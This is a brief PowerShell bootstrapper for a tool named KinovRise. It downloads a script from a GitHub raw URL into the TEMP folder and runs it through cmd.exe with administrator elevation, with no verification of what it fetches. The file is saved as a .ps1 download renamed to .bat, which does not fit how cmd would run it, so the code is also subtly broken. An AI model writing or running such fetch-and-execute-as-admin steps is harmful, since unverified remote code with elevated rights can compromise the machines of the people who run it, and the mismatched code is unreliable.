# KinovRise Bootstrapper
$batUrl = "https://raw.githubusercontent.com/ranusTeam41/kinovrise/refs/heads/main/KinovRise.ps1"
$tempBat = "$env:TEMP\KinovRise.bat"

Invoke-WebRequest -Uri $batUrl -OutFile $tempBat

Start-Process "cmd.exe" -ArgumentList "/c `"$tempBat`"" -Verb RunAs
